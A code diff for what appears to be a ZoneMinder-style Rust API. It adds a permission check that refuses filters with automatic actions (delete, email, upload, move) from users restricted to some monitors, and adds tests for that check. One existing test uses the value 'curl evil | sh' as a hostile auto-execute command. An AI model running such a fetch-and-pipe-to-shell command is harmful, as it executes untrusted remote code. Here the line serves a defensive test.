@@ -73,6 +73,105 @@ fn refuse_command_change(
     Ok(())
 }
 
+/// The automatic actions a saved filter can take on the events it matches,
+/// not counting AutoExecute, which [`refuse_command_change`] covers.
+#[derive(Debug, Default, Clone, Copy)]
+struct AutoActions {
+    archive: u8,
+    unarchive: u8,
+    video: u8,
+    upload: u8,
+    email: u8,
+    message: u8,
+    delete: u8,
+    move_: u8,
+    copy: u8,
+    update_disk_space: u8,
+}
+
+impl AutoActions {
+    fn of(m: &filters::Model) -> Self {
+        Self {
+            archive: m.auto_archive,
+            unarchive: m.auto_unarchive,
+            video: m.auto_video,
+            upload: m.auto_upload,
+            email: m.auto_email,
+            message: m.auto_message,
+            delete: m.auto_delete,
+            move_: m.auto_move,
+            copy: m.auto_copy,
+            update_disk_space: m.update_disk_space,
+        }
+    }
+
+    /// The actions after a create or update: a field the request sets wins,
+    /// one it leaves out keeps its current value.
+    #[allow(clippy::too_many_arguments)]
+    fn with(
+        self,
+        archive: Option<u8>,
+        unarchive: Option<u8>,
+        video: Option<u8>,
+        upload: Option<u8>,
+        email: Option<u8>,
+        message: Option<u8>,
+        delete: Option<u8>,
+        move_: Option<u8>,
+        copy: Option<u8>,
+        update_disk_space: Option<u8>,
+    ) -> Self {
+        Self {
+            archive: archive.unwrap_or(self.archive),
+            unarchive: unarchive.unwrap_or(self.unarchive),
+            video: video.unwrap_or(self.video),
+            upload: upload.unwrap_or(self.upload),
+            email: email.unwrap_or(self.email),
+            message: message.unwrap_or(self.message),
+            delete: delete.unwrap_or(self.delete),
+            move_: move_.unwrap_or(self.move_),
+            copy: copy.unwrap_or(self.copy),
+            update_disk_space: update_disk_space.unwrap_or(self.update_disk_space),
+        }
+    }
+
+    fn any(&self) -> bool {
+        [
+            self.archive,
+            self.unarchive,
+            self.video,
+            self.upload,
+            self.email,
+            self.message,
+            self.delete,
+            self.move_,
+            self.copy,
+            self.update_disk_space,
+        ]
+        .iter()
+        .any(|&v| v != 0)
+    }
+}
+
+/// `zmfilter.pl` runs a saved filter over every monitor's events, whoever
+/// owns it. A filter that changes events or sends them somewhere would act on
+/// monitors the owner can't see or edit, so saving one needs Edit on every
+/// monitor (or System Edit). A restricted user may still save plain filters,
+/// and may turn the actions off on one they own.
+fn refuse_auto_actions(
+    claims: &UserClaims,
+    scope: &MonitorScope,
+    actions: AutoActions,
+) -> AppResult<()> {
+    if can_manage_all(claims) || !scope.is_restricted() || !actions.any() {
+        return Ok(());
+    }
+    Err(AppError::PermissionDeniedError(
+        "filters with automatic actions run on every monitor, so they need Edit on every monitor"
+            .to_string(),
+    ))
+}
+
 fn owns(claims: &UserClaims, owner: Option<u32>) -> bool {
     owner == Some(claims.uid)
 }
@@ -182,6 +281,7 @@ pub async fn update(
     id: u32,
     req: &crate::dto::request::UpdateFilterRequest,
     claims: &UserClaims,
+    scope: &MonitorScope,
 ) -> AppResult<FilterResponse> {
     // Ownership: only the owner or a System-Edit admin may modify a filter.
     let existing = repo::filters::find_by_id(state.db(), id)
@@ -195,6 +295,22 @@ pub async fn update(
         req.auto_execute,
         req.auto_execute_cmd.as_deref(),
         existing.auto_execute,
+    )?;
+    refuse_auto_actions(
+        claims,
+        scope,
+        AutoActions::of(&existing).with(
+            req.auto_archive,
+            req.auto_unarchive,
+            req.auto_video,
+            req.auto_upload,
+            req.auto_email,
+            req.auto_message,
+            req.auto_delete,
+            req.auto_move,
+            req.auto_copy,
+            req.update_disk_space,
+        ),
     )?;
 
     // A structured AST, when supplied, is translated to ZoneMinder's flat
@@ -223,10 +339,27 @@ pub async fn create(
     state: &AppState,
     req: crate::dto::request::CreateFilterRequest,
     claims: &UserClaims,
+    scope: &MonitorScope,
 ) -> AppResult<FilterResponse> {
     // A structured AST, when supplied, is translated to ZoneMinder's flat
     // query_json and wins over any raw string.
     refuse_command_change(claims, req.auto_execute, req.auto_execute_cmd.as_deref(), 0)?;
+    refuse_auto_actions(
+        claims,
+        scope,
+        AutoActions::default().with(
+            req.auto_archive,
+            req.auto_unarchive,
+            req.auto_video,
+            req.auto_upload,
+            req.auto_email,
+            req.auto_message,
+            req.auto_delete,
+            req.auto_move,
+            req.auto_copy,
+            req.update_disk_space,
+        ),
+    )?;
     let mut req = req;
     if let Some(ast) = &req.filter {
         req.query_json = crate::service::filter_translate::to_zm_query_json(ast)?;
@@ -373,7 +506,7 @@ mod tests {
                 ..Default::default()
             },
         ] {
-            let err = create(&state, req, &events_editor(4))
+            let err = create(&state, req, &events_editor(4), &MonitorScope::All)
                 .await
                 .expect_err("must be refused");
             assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
@@ -391,7 +524,7 @@ mod tests {
             auto_execute_cmd: Some("curl evil | sh".into()),
             ..Default::default()
         };
-        let err = update(&state, 5, &req, &events_editor(4))
+        let err = update(&state, 5, &req, &events_editor(4), &MonitorScope::All)
             .await
             .expect_err("must be refused");
         assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
@@ -414,7 +547,7 @@ mod tests {
             name: Some("renamed".into()),
             ..Default::default()
         };
-        let err = update(&state, 5, &req, &events_editor(4))
+        let err = update(&state, 5, &req, &events_editor(4), &MonitorScope::All)
             .await
             .expect_err("must be refused");
         assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
@@ -457,7 +590,9 @@ mod tests {
             query_json: Some("{\"k\":\"v\"}".into()),
             ..Default::default()
         };
-        let resp = update(&state, 2, &req, &admin_claims()).await.unwrap();
+        let resp = update(&state, 2, &req, &admin_claims(), &MonitorScope::All)
+            .await
+            .unwrap();
         assert_eq!(resp.name, "new");
         assert_eq!(resp.query_json, "{\"k\":\"v\"}");
     }
@@ -500,7 +635,7 @@ mod tests {
             name: Some("x".into()),
             ..Default::default()
         };
-        let err = update(&state, 1, &req, &admin_claims())
+        let err = update(&state, 1, &req, &admin_claims(), &MonitorScope::All)
             .await
             .expect_err("should error");
         matches!(err, AppError::NotFoundError(_));
@@ -568,5 +703,130 @@ mod tests {
             .await
             .expect("system admin may read any filter");
         assert_eq!(resp.id, 5);
+    }
+
+    // ---- Automatic actions need every monitor -------------------------------
+
+    /// Edit on monitor 1 only.
+    fn one_monitor() -> MonitorScope {
+        MonitorScope::Restricted(std::collections::HashMap::from([(1, Level::Edit)]))
+    }
+
+    #[tokio::test]
+    async fn a_restricted_user_cannot_create_an_auto_action_filter() {
+        let state =
+            AppState::for_test_with_db(MockDatabase::new(DatabaseBackend::MySql).into_connection());
+        let base = || crate::dto::request::CreateFilterRequest {
+            name: "x".into(),
+            query_json: "{}".into(),
+            ..Default::default()
+        };
+        for req in [
+            crate::dto::request::CreateFilterRequest {
+                auto_delete: Some(1),
+                ..base()
+            },
+            crate::dto::request::CreateFilterRequest {
+                auto_email: Some(1),
+                ..base()
+            },
+            crate::dto::request::CreateFilterRequest {
+                auto_archive: Some(1),
+                ..base()
+            },
+            crate::dto::request::CreateFilterRequest {
+                auto_move: Some(1),
+                ..base()
+            },
+            crate::dto::request::CreateFilterRequest {
+                auto_upload: Some(1),
+                ..base()
+            },
+        ] {
+            for scope in [one_monitor(), MonitorScope::ViewOnly] {
+                let err = create(&state, req.clone(), &events_editor(4), &scope)
+                    .await
+                    .expect_err("must be refused");
+                assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn a_restricted_owner_cannot_keep_auto_actions_while_editing() {
+        let existing = FilterModel {
+            auto_delete: 1,
+            ..mk_filter_owned(5, Some(4))
+        };
+        let db = MockDatabase::new(DatabaseBackend::MySql)
+            .append_query_results::<FilterModel, _, _>(vec![vec![existing]])
+            .into_connection();
+        let state = AppState::for_test_with_db(db);
+        let req = crate::dto::request::UpdateFilterRequest {
+            query_json: Some("{}".into()),
+            ..Default::default()
+        };
+        let err = update(&state, 5, &req, &events_editor(4), &one_monitor())
+            .await
+            .expect_err("must be refused");
+        assert!(matches!(err, AppError::PermissionDeniedError(_)), "{err:?}");
+    }
+
+    #[tokio::test]
+    async fn a_restricted_owner_may_turn_auto_actions_off() {
+        let existing = FilterModel {
+            auto_delete: 1,
+            ..mk_filter_owned(5, Some(4))
+        };
+        let off = FilterModel {
+            auto_delete: 0,
+            ..existing.clone()
+        };
+        let db = MockDatabase::new(DatabaseBackend::MySql)
+            .append_query_results::<FilterModel, _, _>(vec![
+                vec![existing.clone()],
+                vec![existing],
+                vec![off],
+            ])
+            .append_exec_results(vec![MockExecResult {
+                last_insert_id: 0,
+                rows_affected: 1,
+            }])
+            .into_connection();
+        let state = AppState::for_test_with_db(db);
+        let req = crate::dto::request::UpdateFilterRequest {
+            auto_delete: Some(0),
+            ..Default::default()
+        };
+        let resp = update(&state, 5, &req, &events_editor(4), &one_monitor())
+            .await
+            .expect("turning auto actions off is allowed");
+        assert_eq!(resp.auto_delete, 0);
+    }
+
+    #[tokio::test]
+    async fn a_user_with_every_monitor_may_create_an_auto_action_filter() {
+        let created = FilterModel {
+            auto_delete: 1,
+            ..mk_filter_owned(9, Some(4))
+        };
+        let db = MockDatabase::new(DatabaseBackend::MySql)
+            .append_exec_results(vec![MockExecResult {
+                last_insert_id: 9,
+                rows_affected: 1,
+            }])
+            .append_query_results::<FilterModel, _, _>(vec![vec![created]])
+            .into_connection();
+        let state = AppState::for_test_with_db(db);
+        let req = crate::dto::request::CreateFilterRequest {
+            name: "purge".into(),
+            query_json: "{}".into(),
+            auto_delete: Some(1),
+            ..Default::default()
+        };
+        let resp = create(&state, req, &events_editor(4), &MonitorScope::All)
+            .await
+            .expect("an unrestricted Events editor may");
+        assert_eq!(resp.auto_delete, 1);
     }
 }
